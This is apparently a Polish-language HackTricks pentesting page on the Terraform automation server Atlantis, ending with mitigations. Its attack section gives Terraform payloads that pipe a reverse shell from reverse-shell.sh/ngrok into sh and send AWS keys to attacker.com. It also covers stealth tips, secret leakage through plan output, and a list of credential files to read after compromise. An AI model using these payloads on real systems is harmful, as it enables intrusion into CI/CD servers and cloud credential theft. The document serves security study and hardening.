# Bezpieczestwo Atlantis

<details>

<summary><strong>Nauka hakowania AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeli chcesz zobaczy swoj **firm reklamowan w HackTricks** lub **pobra HackTricks w formacie PDF**, sprawd藕 [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Zdobd藕 [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** mnie na **Twitterze**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel si swoimi sztuczkami hakerskimi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Podstawowe informacje

Atlantis pomaga uruchamia terraform z Pull Requests z serwera git.

![](<../.gitbook/assets/image (161).png>)

## Lokalne laboratorium

1. Przejd藕 do strony **wyda atlantis** na [https://github.com/runatlantis/atlantis/releases](https://github.com/runatlantis/atlantis/releases) i **pobierz** odpowiedni wersj.
2. Utw贸rz **token osobisty** (z dostpem do repozytorium) swojego u偶ytkownika **github**
3. Wykonaj `./atlantis testdrive`, aby utworzy **repozytorium demonstracyjne**, z kt贸rego mo偶na **komunikowa si z atlantis**
1. Mo偶esz uzyska dostp do strony internetowej pod adresem 127.0.0.1:4141

## Dostp do Atlantis

### Dane uwierzytelniajce serwera Git

**Atlantis** obsuguje kilka host贸w git, takich jak **Github**, **Gitlab**, **Bitbucket** i **Azure DevOps**.\
Jednak偶e, aby uzyska dostp do repozytori贸w na tych platformach i wykonywa akcje, musi zosta im nadane pewne **uprzywilejowane uprawnienia** (przynajmniej uprawnienia do zapisu).\
[Dokumentacja](https://www.runatlantis.io/docs/access-credentials.html#create-an-atlantis-user-optional) zachca do utworzenia u偶ytkownika na tych platformach specjalnie dla Atlantis, ale niekt贸rzy ludzie mog u偶ywa kont osobistych.

{% hint style="warning" %}
Z perspektywy atakujcego, **konto Atlantis** bdzie bardzo **interesujce do skompromitowania**.
{% endhint %}

### Webhooki

Atlantis opcjonalnie u偶ywa [**sekret贸w webhook贸w**](https://www.runatlantis.io/docs/webhook-secrets.html#generating-a-webhook-secret), aby zweryfikowa, czy **webhooki** otrzymywane od twojego hosta Git s **autentyczne**.

Jednym sposobem potwierdzenia tego byoby **dozwolenie na 偶dania tylko z adres贸w IP** twojego hosta Git, ale atwiejszym sposobem jest u偶ycie Sekretu Webhooka.

Zauwa偶, 偶e chyba 偶e u偶ywasz prywatnego serwera github lub bitbucket, bdziesz musia wystawi punkty kocowe webhook贸w do Internetu.

{% hint style="warning" %}
Atlantis bdzie **wystawia webhooki**, aby serwer git m贸g mu przesya informacje. Z perspektywy atakujcego byoby interesujce dowiedzie si, **czy mo偶na mu wysya wiadomoci**.
{% endhint %}

### Dane uwierzytelniajce dostawcy <a href="#provider-credentials" id="provider-credentials"></a>

[Z dokumentacji:](https://www.runatlantis.io/docs/provider-credentials.html)

Atlantis uruchamia Terraform po prostu **wykonujc polecenia `terraform plan` i `apply`** na serwerze, **na kt贸rym jest hostowany Atlantis**. Tak jak w przypadku lokalnego uruchamiania Terraform, Atlantis potrzebuje powiadcze dla konkretnego dostawcy.

To od ciebie zale偶y, jak [dostarczasz powiadczenia](https://www.runatlantis.io/docs/provider-credentials.html#aws-specific-info) dla konkretnego dostawcy do Atlantis:

* Chart Helm [Atlantis](https://www.runatlantis.io/docs/deployment.html#kubernetes-helm-chart) i Modu [AWS Fargate](https://www.runatlantis.io/docs/deployment.html#aws-fargate) maj wasne mechanizmy do dostarczania powiadcze dostawcy. Przeczytaj ich dokumentacj.
* Jeli uruchamiasz Atlantis w chmurze, wiele chmur ma sposoby udzielenia dostpu do API chmury aplikacjom dziaajcym na nich, np.:
* [Role EC2 AWS](https://registry.terraform.io/providers/hashicorp/aws/latest/docs) (Wyszukaj "EC2 Role")
* [Konta usug instancji GCE](https://registry.terraform.io/providers/hashicorp/google/latest/docs/guides/provider\_reference)
* Wielu u偶ytkownik贸w ustawia zmienne rodowiskowe, np. `AWS_ACCESS_KEY`, tam, gdzie dziaa Atlantis.
* Inni tworz niezbdne pliki konfiguracyjne, np. `~/.aws/credentials`, tam, gdzie dziaa Atlantis.
* U偶yj [Dostawcy HashiCorp Vault](https://registry.terraform.io/providers/hashicorp/vault/latest/docs), aby uzyska powiadczenia dostawcy.

{% hint style="warning" %}
**Kontener**, w kt贸rym **dziaa Atlantis**, prawdopodobnie **zawiera uprzywilejowane powiadczenia** do dostawc贸w (AWS, GCP, Github...), kt贸rymi Atlantis zarzdza za pomoc Terraform.
{% endhint %}

### Strona internetowa

Domylnie Atlantis uruchomi **stron internetow na porcie 4141 w localhost**. Ta strona pozwala jedynie wczy/wyczy zastosowanie atlantis i sprawdzi status planu repozytori贸w oraz odblokowa je (nie pozwala na modyfikowanie rzeczy, wic nie jest to zbyt przydatne).

Prawdopodobnie nie bdzie ona wystawiona do Internetu, ale domylnie **nie s wymagane 偶adne powiadczenia** do jej uzyskania (a jeli s, domylne to `atlantis`:`atlantis`).

## Konfiguracja serwera

Konfiguracj `atlantis server` mo偶na okreli za pomoc flag w wierszu polece, zmiennych rodowiskowych, pliku konfiguracyjnego lub mieszanki tych trzech.

* Mo偶esz znale藕 [**tutaj list flag**](https://www.runatlantis.io/docs/server-configuration.html#server-configuration) obsugiwanych przez serwer Atlantis
* Mo偶esz znale藕 [**tutaj, jak przeksztaci opcj konfiguracji w zmienn rodowiskow**](https://www.runatlantis.io/docs/server-configuration.html#environment-variables)

Wartoci s **wybierane w tej kolejnoci**:

1. Flagi
2. Zmienne rodowiskowe
3. Plik konfiguracyjny

{% hint style="warning" %}
Zauwa偶, 偶e w konfiguracji mo偶esz znale藕 interesujce wartoci, takie jak **tokeny i hasa**.
{% endhint %}

### Konfiguracja repozytori贸w

Niekt贸re konfiguracje wpywaj na **zarzdzanie repozytoriami**. Jednak偶e mo偶liwe jest, 偶e **ka偶de repozytorium wymaga r贸偶nych ustawie**, wic istniej sposoby okrelenia ka偶dego repozytorium. Oto kolejno priorytet贸w:

1. Plik [**`/atlantis.yml`**](https://www.runatlantis.io/docs/repo-level-atlantis-yaml.html#repo-level-atlantis-yaml-config) repozytorium. Ten plik mo偶e by u偶ywany do okrelenia sposobu traktowania repozytorium przez atlantis. Jednak domylnie niekt贸re klucze nie mog by okrelone tutaj bez odpowiednich flag.
1. Prawdopodobnie wymagane jest zezwolenie na to za pomoc flag takich jak `allowed_overrides` lub `allow_custom_workflows`
2. [**Konfiguracja po stronie serwera**](https://www.runatlantis.io/docs/server-side-repo-config.html#server-side-config): Mo偶esz przekaza j za pomoc flagi `--repo-config` i jest to yaml konfigurujcy nowe ustawienia dla ka偶dego repozytorium (obsugiwane s wyra偶enia regularne)
3. **Domylne** wartoci
#### Zabezpieczenia PR

Atlantis pozwala wskaza, czy chcesz, aby **PR** zosta **`zatwierdzony`** przez kogo innego (nawet jeli nie jest to ustawione w zabezpieczeniach gazi) i/lub by **`scalony`** (zabezpieczenia gazi zostay przekroczone) **przed uruchomieniem apply**. Z punktu widzenia bezpieczestwa zaleca si ustawienie obu opcji.

W przypadku, gdy `allowed_overrides` jest ustawione na True, te ustawienia mog by **nadpisane w ka偶dym projekcie przez plik `/atlantis.yml`**.

#### Skrypty

Konfiguracja repozytorium mo偶e **okreli skrypty** do uruchomienia [**przed**](https://www.runatlantis.io/docs/pre-workflow-hooks.html#usage) (_pre workflow hooks_) i [**po**](https://www.runatlantis.io/docs/post-workflow-hooks.html) (_post workflow hooks_) **wykonaniu workflow**.

Nie ma opcji **okrelenia** tych skrypt贸w w **pliku `/atlantis.yml`** repozytorium.

#### Workflow

W konfiguracji repozytorium (konfiguracja po stronie serwera) mo偶na [**okreli nowy domylny workflow**](https://www.runatlantis.io/docs/server-side-repo-config.html#change-the-default-atlantis-workflow) lub [**utworzy nowe niestandardowe workflowy**](https://www.runatlantis.io/docs/custom-workflows.html#custom-workflows)**.** Mo偶na r贸wnie偶 **okreli**, kt贸re **repozytoria** mog **uzyska dostp** do **nowo** wygenerowanych.\
Nastpnie mo偶na zezwoli plikowi **atlantis.yaml** ka偶dego repozytorium na **okrelenie u偶ywanego workflowu**.

{% hint style="danger" %}
Jeli flaga [**konfiguracji po stronie serwera**](https://www.runatlantis.io/docs/server-side-repo-config.html#server-side-config) `allow_custom_workflows` jest ustawiona na **True**, workflowy mog by **okrelone** w pliku **`atlantis.yaml`** ka偶dego repozytorium. Potrzebne jest r贸wnie偶, aby **`allowed_overrides`** okrelao r贸wnie偶 **`workflow`** do **nadpisania workflowu**, kt贸ry ma by u偶yty.\
To w zasadzie da **RCE na serwerze Atlantis ka偶demu u偶ytkownikowi, kt贸ry mo偶e uzyska dostp do tego repozytorium**.
```yaml
# atlantis.yaml
version: 3
projects:
- dir: .
workflow: custom1
workflows:
custom1:
plan:
steps:
- init
- run: my custom plan command
apply:
steps:
- run: my custom apply command
```
{% endhint %}

#### Sprawdzanie zasad Conftest

Atlantis obsuguje uruchamianie **serwerowych** [**zasad conftest**](https://www.conftest.dev/) przeciwko wynikowi planu. Powszechne przypadki u偶ycia tego kroku obejmuj:

* Odmawianie korzystania z listy modu贸w
* Potwierdzanie atrybut贸w zasobu podczas tworzenia
* Wykrywanie niezamierzonych usuni zasob贸w
* Zapobieganie ryzyku bezpieczestwa (tj. ujawnianie bezpiecznych port贸w publicznie)

Mo偶esz sprawdzi, jak to skonfigurowa w [**dokumentacji**](https://www.runatlantis.io/docs/policy-checking.html#how-it-works).

## Komendy Atlantis

[W **dokumentacji**](https://www.runatlantis.io/docs/using-atlantis.html#using-atlantis) znajdziesz opcje, kt贸re mo偶esz u偶y do uruchomienia Atlantisa:
```bash
# Get help
atlantis help

# Run terraform plan
atlantis plan [options] -- [terraform plan flags]
##Options:
## -d directory
## -p project
## --verbose
## You can also add extra terraform options

# Run terraform apply
atlantis apply [options] -- [terraform apply flags]
##Options:
## -d directory
## -p project
## -w workspace
## --auto-merge-disabled
## --verbose
## You can also add extra terraform options
```
## Ataki

{% hint style="warning" %}
Jeli podczas eksploatacji napotkasz ten **bd**: `Error: Error acquiring the state lock`

Mo偶esz naprawi to, wykonujc:
```
atlantis unlock #You might need to run this in a different PR
atlantis plan -- -lock=false
```
{% endhint %}

### Plan RCE w Atlancie - Modyfikacja konfiguracji w nowym PR

Jeli masz uprawnienia do zapisu w repozytorium, bdziesz m贸g utworzy na nim now ga藕 i wygenerowa PR. Jeli mo偶esz **wykona `atlantis plan`** (lub mo偶e by on wykonany automatycznie) **bdziesz m贸g wykona zdalne wykonanie kodu (RCE) w serwerze Atlantisa**.

Mo偶esz to zrobi, umieszczajc [**zewntrzne 藕r贸do danych w Atlancie**](https://registry.terraform.io/providers/hashicorp/external/latest/docs/data-sources/data\_source). Wystarczy umieci adunek, podobny do poni偶szego, w pliku `main.tf`:
```json
data "external" "example" {
program = ["sh", "-c", "curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh"]
}
```
#### Stealthier Attack

Mo偶esz przeprowadzi ten atak nawet w **bardziej skrytym spos贸b**, postpujc zgodnie z tymi sugestiami:

* Zamiast dodawa rev shell bezporednio do pliku terraform, mo偶esz **zaadowa zewntrzny zas贸b**, kt贸ry zawiera rev shell:
```javascript
module "not_rev_shell" {
source = "git@github.com:carlospolop/terraform_external_module_rev_shell//modules"
}
```
Mo偶esz znale藕 kod powoki rev w [https://github.com/carlospolop/terraform\_external\_module\_rev\_shell/tree/main/modules](https://github.com/carlospolop/terraform\_external\_module\_rev\_shell/tree/main/modules)

* W zewntrznym zasobie u偶yj funkcji **ref**, aby ukry **kod powoki terraform w gazi** wewntrz repozytorium, co w rodzaju: `git@github.com:carlospolop/terraform_external_module_rev_shell//modules?ref=b401d2b`
* **Zamiast** tworzy **PR do master** w celu uruchomienia Atlantisa, **utw贸rz 2 gazie** (test1 i test2) i utw贸rz **PR z jednej do drugiej**. Po zakoczeniu ataku, po prostu **usu PR i gazie**.

### Wyciek sekret贸w z planu Atlantisa

Mo偶esz **wycign sekrety u偶ywane przez terraform** uruchamiajc `atlantis plan` (`terraform plan`) poprzez umieszczenie czego w ten dese w pliku terraform:
```json
output "dotoken" {
value = nonsensitive(var.do_token)
}
```
### Atlantis zastosuj RCE - Modyfikacja konfiguracji w nowym PR

Jeli masz uprawnienia do zapisu w repozytorium, bdziesz m贸g utworzy na nim now ga藕 i wygenerowa PR. Jeli mo偶esz **wykona `atlantis apply`, bdziesz m贸g wykona RCE w serwerze Atlantis**.

Jednak zazwyczaj bdziesz musia omin pewne zabezpieczenia:

- **Mo偶liwo scalenia**: Jeli to zabezpieczenie jest ustawione w Atlantis, mo偶esz uruchomi **`atlantis apply` tylko wtedy, gdy PR jest mo偶liwy do scalenia** (co oznacza, 偶e zabezpieczenie gazi musi zosta zignorowane).
- Sprawd藕 potencjalne [**omijanie zabezpiecze gazi**](https://github.com/carlospolop/hacktricks-cloud/blob/master/pentesting-ci-cd/broken-reference/README.md)
- **Zatwierdzenie**: Jeli to zabezpieczenie jest ustawione w Atlantis, **inny u偶ytkownik musi zatwierdzi PR**, zanim bdziesz m贸g uruchomi `atlantis apply`
- Domylnie mo偶esz nadu偶y [**tokena Gitbota, aby omin to zabezpieczenie**](https://github.com/carlospolop/hacktricks-cloud/blob/master/pentesting-ci-cd/broken-reference/README.md)

Uruchamianie **`terraform apply` na zoliwym pliku Terraform z** [**local-exec**](https://www.terraform.io/docs/provisioners/local-exec.html)**.**\
Wystarczy upewni si, 偶e pewny adunek, jak poni偶sze przykady, znajduje si w pliku `main.tf`:
```json
// Payload 1 to just steal a secret
resource "null_resource" "secret_stealer" {
provisioner "local-exec" {
command = "curl https://attacker.com?access_key=$AWS_ACCESS_KEY&secret=$AWS_SECRET_KEY"
}
}

// Payload 2 to get a rev shell
resource "null_resource" "rev_shell" {
provisioner "local-exec" {
command = "sh -c 'curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh'"
}
}
```
Postpuj zgodnie z **sugestiami z poprzedniej techniki**, aby przeprowadzi ten atak w **bardziej skrytym spos贸b**.

### Wstrzykiwanie Parametr贸w Terraform

Podczas uruchamiania `atlantis plan` lub `atlantis apply`, Terraform jest uruchamiany wewntrznie, mo偶esz przekaza polecenia do Terraform z atlantis, komentujc co w stylu:
```bash
atlantis plan -- <terraform commands>
atlantis plan -- -h #Get terraform plan help

atlantis apply -- <terraform commands>
atlantis apply -- -h #Get terraform apply help
```
Co, co mo偶na przekaza, to zmienne rodowiskowe, kt贸re mog by pomocne w ominiciu niekt贸rych zabezpiecze. Sprawd藕 zmienne rodowiskowe Terraforma w [https://www.terraform.io/cli/config/environment-variables](https://www.terraform.io/cli/config/environment-variables)

### Niestandardowy przepyw pracy

Uruchamianie **zoliwych niestandardowych polece budowania** okrelonych w pliku `atlantis.yaml`. Atlantis u偶ywa pliku `atlantis.yaml` z gazi 偶dania cignicia, **nie** z `master`.\
Ta mo偶liwo zostaa wspomniana w poprzednim rozdziale:

{% hint style="danger" %}
Jeli flaga [**konfiguracja po stronie serwera**](https://www.runatlantis.io/docs/server-side-repo-config.html#server-side-config) `allow_custom_workflows` jest ustawiona na **True**, przepywy pracy mog by **okrelone** w pliku **`atlantis.yaml`** ka偶dego repozytorium. Potrzebne jest r贸wnie偶, aby **`allowed_overrides`** okrelao r贸wnie偶 **`workflow`** do **zastpienia przepywu pracy**, kt贸ry ma by u偶yty.

To w zasadzie da **RCE w serwerze Atlantis dla ka偶dego u偶ytkownika, kt贸ry mo偶e uzyska dostp do tego repozytorium**.
```yaml
# atlantis.yaml
version: 3
projects:
- dir: .
workflow: custom1
workflows:
custom1:
plan:
steps:
- init
- run: my custom plan command
apply:
steps:
- run: my custom apply command
```
{% endhint %}

### Pomijanie zabezpiecze planowania/wdra偶ania

Jeli flaga [**konfiguracja po stronie serwera**](https://www.runatlantis.io/docs/server-side-repo-config.html#server-side-config) `allowed_overrides` _ma_ skonfigurowane `apply_requirements`, repozytorium mo偶e **zmodyfikowa zabezpieczenia planowania/wdra偶ania w celu ich pominicia**.
```yaml
repos:
- id: /.*/
apply_requirements: []
```
### Przechwytywanie PR

Jeli kto wysya **komentarze `atlantis plan/apply` na Twoje wa偶ne 偶dania cignicia,** spowoduje to uruchomienie terraformu, gdy nie chcesz tego.

Co wicej, jeli nie masz skonfigurowanej **ochrony gazi** w celu **ponownej oceny** ka偶dego PR po **wciniciu nowego commita** do niego, kto m贸gby **napisa zoliwe konfiguracje** (sprawd藕 poprzednie scenariusze) w konfiguracji terraformu, uruchomi `atlantis plan/apply` i uzyska RCE.

Oto **ustawienie** w zabezpieczeniach gazi Github:

![](<../.gitbook/assets/image (216).png>)

### Sekret webhooka

Jeli uda Ci si **ukra u偶ywany sekret webhooka** lub jeli **nie ma u偶ywanego 偶adnego sekretu webhooka**, mo偶esz **wywoa webhook Atlantisa** i **wywoa polecenia atlatis** bezporednio.

### Bitbucket

Bitbucket Cloud **nie obsuguje sekret贸w webhooka**. Mo偶e to pozwoli atakujcym na **podrobienie 偶da z Bitbucket**. Upewnij si, 偶e zezwalasz tylko na adresy IP Bitbucket.

* Oznacza to, 偶e **atakujcy** m贸gby wysya **faszywe 偶dania do Atlantisa**, kt贸re wygldaj, jakby pochodziy z Bitbucket.
* Jeli okrelasz `--repo-allowlist`, mogliby tylko faszowa 偶dania dotyczce tych repozytori贸w, wic najwiksz szkod mogliby wyrzdzi na swoich wasnych repozytoriach.
* Aby temu zapobiec, dodaj na **bia list adresy IP Bitbucketa** (zobacz [adresy IP Bitbucket Cloud](https://confluence.atlassian.com/bitbucket/what-are-the-bitbucket-cloud-ip-addresses-i-should-use-to-configure-my-corporate-firewall-343343385.html)).

## Po wykorzystaniu

Jeli udao Ci si uzyska dostp do serwera lub przynajmniej uzyskae LFI, istnieje kilka interesujcych rzeczy, kt贸re warto spr贸bowa odczyta:

* `/home/atlantis/.git-credentials` Zawiera dane dostpu do VCS
* `/atlantis-data/atlantis.db` Zawiera dane dostpu do VCS z dodatkowymi informacjami
* `/atlantis-data/repos/<org_name>`_`/`_`<repo_name>/<pr_num>/<workspace>/<path_to_dir>/.terraform/terraform.tfstate` Plik stanu terraformu
* Przykad: /atlantis-data/repos/ghOrg\_/\_myRepo/20/default/env/prod/.terraform/terraform.tfstate
* `/proc/1/environ` Zmienne rodowiskowe
* `/proc/[2-20]/cmdline` Linia polece `atlantis server` (mo偶e zawiera dane poufne)

## Mitygacje

### Nie U偶ywaj Na Publicznych Repozytoriach <a href="#don-t-use-on-public-repos" id="don-t-use-on-public-repos"></a>

Poniewa偶 ka偶dy mo偶e komentowa publiczne 偶dania cignicia, nawet przy dostpnych wszystkich dostpnych zabezpieczeniach, nadal jest niebezpieczne uruchamianie Atlantisa na publicznych repozytoriach bez waciwej konfiguracji ustawie zabezpiecze.

### Nie U偶ywaj `--allow-fork-prs` <a href="#don-t-use-allow-fork-prs" id="don-t-use-allow-fork-prs"></a>

Jeli dziaasz na publicznym repozytorium (co nie jest zalecane, patrz powy偶ej), nie powiniene ustawia `--allow-fork-prs` (domylnie false), poniewa偶 ka偶dy mo偶e otworzy 偶danie cignicia ze swojego forka do Twojego repozytorium.

### `--repo-allowlist` <a href="#repo-allowlist" id="repo-allowlist"></a>

Atlantis wymaga okrelenia biaej listy repozytori贸w, z kt贸rych bdzie akceptowa webhooki za pomoc flagi `--repo-allowlist`. Na przykad:

* Konkretne repozytoria: `--repo-allowlist=github.com/runatlantis/atlantis,github.com/runatlantis/atlantis-tests`
* Caa Twoja organizacja: `--repo-allowlist=github.com/runatlantis/*`
* Wszystkie repozytoria w Twojej instalacji GitHub Enterprise: `--repo-allowlist=github.yourcompany.com/*`
* Wszystkie repozytoria: `--repo-allowlist=*`. Przydatne, gdy jeste w sieci chronionej, ale niebezpieczne bez ustawienia sekretu webhooka.

Ta flaga zapewnia, 偶e Twoja instalacja Atlantisa nie jest u偶ywana z repozytoriami, kt贸rymi nie zarzdzasz. Zobacz `atlantis server --help` po wicej szczeg贸贸w.

### Ochrona Planowania Terraformu <a href="#protect-terraform-planning" id="protect-terraform-planning"></a>

Jeli atakujcy skadajcy 偶dania cignicia z zoliwym kodem Terraformu znajduje si w Twoim modelu zagro偶e, musisz by wiadomy, 偶e zatwierdzenia `terraform apply` nie s wystarczajce. Istnieje mo偶liwo uruchomienia zoliwego kodu w `terraform plan`, korzystajc z [藕r贸da danych `external`](https://registry.terraform.io/providers/hashicorp/external/latest/docs/data-sources/data\_source) lub poprzez okrelenie zoliwego dostawcy. Ten kod m贸gby wycieka Twoje dane uwierzytelniajce.

Aby temu zapobiec, mo偶esz:

1. Wgra dostawc贸w do obrazu Atlantisa lub hosta i zablokowa egress w produkcji.
2. Wdro偶y protok贸 rejestru dostawc贸w wewntrznie i zablokowa publiczny egress, w ten spos贸b kontrolujesz, kto ma dostp do rejestru zapisu.
3. Zmodyfikowa [konfiguracj repozytorium po stronie serwera](https://www.runatlantis.io/docs/server-side-repo-config.html) w kroku `plan`, aby sprawdza u偶ycie niedozwolonych dostawc贸w lub 藕r贸de danych lub PR-贸w od niedozwolonych u偶ytkownik贸w. Mo偶esz r贸wnie偶 doda dodatkow walidacj w tym punkcie, np. wymagajc "kciuka w g贸r" na PR przed zezwoleniem na kontynuacj `plan`. Conftest mo偶e by tu przydatny.

### Sekrety Webhooka <a href="#webhook-secrets" id="webhook-secrets"></a>

Atlantis powinien by uruchamiany z ustawionymi sekretami webhooka za pomoc zmiennych rodowiskowych `$ATLANTIS_GH_WEBHOOK_SECRET`/`$ATLANTIS_GITLAB_WEBHOOK_SECRET`. Nawet z ustawion flag `--repo-allowlist`, bez sekretu webhooka, atakujcy mogliby wysya 偶dania do Atlantisa podszywajc si pod repozytorium, kt贸re jest na biaej licie. Sekrety webhooka zapewniaj, 偶e 偶dania webhooka faktycznie pochodz od Twojego dostawcy VCS (GitHub lub GitLab).

Jeli korzystasz z Azure DevOps, zamiast sekret贸w webhooka dodaj podstawow nazw u偶ytkownika i haso.

### Podstawowa Autentykacja Azure DevOps <a href="#azure-devops-basic-authentication" id="azure-devops-basic-authentication"></a>

Azure DevOps obsuguje wysyanie nag贸wka podstawowej autentykacji we wszystkich zdarzeniach webhooka. Wymaga to u偶ycia adresu URL HTTPS dla lokalizacji webhooka.

### SSL/HTTPS <a href="#ssl-https" id="ssl-https"></a>

Jeli korzystasz z sekret贸w webhooka, ale ruch odbywa si przez HTTP, sekrety webhooka mog zosta skradzione. Wcz SSL/HTTPS za pomoc flag `--ssl-cert-file` i `--ssl-key-file`.

### Wcz Autentykacj na Serwerze WWW Atlantisa <a href="#enable-authentication-on-atlantis-web-server" id="enable-authentication-on-atlantis-web-server"></a>

Bardzo zaleca si wczenie autentykacji w usudze sieciowej. Wcz BasicAuth za pomoc `--web-basic-auth=true` i skonfiguruj nazw u偶ytkownika i haso za pomoc flag `--web-username=yourUsername` i `--web-password=yourPassword`.

Mo偶esz r贸wnie偶 przekaza je jako zmienne rodowiskowe `ATLANTIS_WEB_BASIC_AUTH=true` `ATLANTIS_WEB_USERNAME=yourUsername` i `ATLANTIS_WEB_PASSWORD=yourPassword`.

## Odnoniki

* [**https://www.runatlantis.io/docs**](https://www.runatlantis.io/docs)
* [**https://www.runatlantis.io/docs/provider-credentials.html**](https://www.runatlantis.io/docs/provider-credentials.html)
